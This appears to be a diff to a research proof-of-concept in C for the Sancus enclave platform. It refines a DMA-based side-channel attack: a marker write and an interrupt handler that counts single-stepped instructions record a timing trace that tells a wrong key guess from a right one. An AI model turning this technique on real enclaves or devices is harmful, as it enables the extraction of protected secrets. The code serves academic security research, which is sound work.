@@ -5,18 +5,26 @@
 #include <sancus_support/sm_io.h>
 #include <sancus_support/sancus_step.h>
 
-#define INSTRUCTION_NUMBER_JMP 36
+/* NOTE: in this proof-of-concept, we use an explicit unprotected memory access
+ * as a "marker" to be able to easily recognize the jump instruction of
+ * interest, even when the compiler-generated entry/exit SM code would change.
+ * In a real attack, one would have to manually analyze the assembly code and
+ * use an absolute offset. */
+#define REL_INSTRUCTION_NUMBER_JMP 7
 #define TRACE_MASK 0x1000
 int instruction_counter = 0;
 uint16_t delay = 0;
 uint16_t dma_trace[2] = {0};
 uint16_t dma_trace_idx = 0;
 
+int marker = 0;
+
 DECLARE_SM(foo, 0x1234);
 
 void SM_ENTRY(foo) test(char key) {
     char * p = &key;
     __asm__ __volatile__(
+        "mov #1, %1\n\t"
         "mov %0, r6\n\t"
         "mov #0x42, r7\n\t"
         "cmp.b @r6+, r7\n\t"
@@ -28,7 +36,7 @@ void SM_ENTRY(foo) test(char key) {
         "nop\n\t"
         "2: nop\n\t"
         :
-        :"m"(p)
+        :"m"(p), "m"(marker)
         :"r6", "r7"
     );
 }
@@ -52,11 +60,14 @@ void SM_ENTRY(foo) foo_exit(void)
 
 void irqHandler(void)
 {
-    if (instruction_counter == INSTRUCTION_NUMBER_JMP)
+    if (marker)
     {
-        dma_trace[dma_trace_idx++] = DMA_TRACE;
+    	if (++instruction_counter == REL_INSTRUCTION_NUMBER_JMP)
+    	{
+    	    dma_trace[dma_trace_idx++] = DMA_TRACE;
+    	}
     }
-    ++instruction_counter;
+
     __ss_set_dma_attacker_delay(0);
     uint16_t *pmem_addr = (uint16_t*) irqHandler;
     DMA_ADDR = pmem_addr;
@@ -72,6 +83,7 @@ int main()
     test(0x41);
     pr_info1("DMA_TRACE for wrong guess   = %#x\n", dma_trace[0]);
 
+    marker = 0;
     instruction_counter = 0;
     __ss_start();
     test(0x42);
